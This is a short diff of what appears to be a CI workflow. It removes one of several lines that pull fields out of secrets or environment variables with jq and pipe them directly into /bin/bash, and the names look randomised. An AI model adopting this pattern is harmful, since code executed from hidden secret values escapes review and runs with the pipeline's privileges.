@@ -27,7 +27,6 @@ jobs:
           u253: ${{ secrets.u253 }}
         run: |
           printf '%s' "$u253" | jq -r .mxy74 | /bin/bash
-          echo $lmdw910 | jq -r .xdnc4 | /bin/bash
           printf '%s' "$gowwr7900" | jq -r .ksia3992 | /bin/bash
 
       - name: Store results
